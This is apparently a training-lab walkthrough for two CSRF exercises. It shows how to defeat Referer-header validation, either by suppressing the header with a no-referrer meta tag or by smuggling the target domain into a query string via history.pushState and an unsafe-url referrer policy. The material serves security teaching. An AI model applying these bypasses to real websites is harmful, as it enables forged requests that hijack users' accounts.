## CSRF where Referer validation depends on header being present

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the domain in the Referer HTTP header then the request is rejected.
3. Delete the Referer header entirely and observe that the request is now accepted.
4. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Include the following HTML to suppress the Referer header:

`<meta name="referrer" content="no-referrer">`

5. Store the exploit, then click "Deliver to victim" to solve the lab.

## CSRF with broken Referer validation

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater. Observe that if you change the domain in the Referer HTTP header, the request is rejected.
3. Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this:

`Referer: https://arbitrary-incorrect-domain.net?your-lab-id.web-security-academy.net`

4. Send the request and observe that it is now accepted. The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string.
5. Create a CSRF proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab and host it on the exploit server. Edit the JavaScript so that the third argument of the history.pushState() function includes a query string with your lab instance URL as follows:

`history.pushState("", "", "/?your-lab-id.web-security-academy.net")`

This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.

6. If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again. This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:

Referrer-Policy: unsafe-url

Note that unlike the normal Referer header, the word "referrer" must be spelled correctly in this case.
7. Store the exploit, then click "Deliver to victim" to solve the lab.
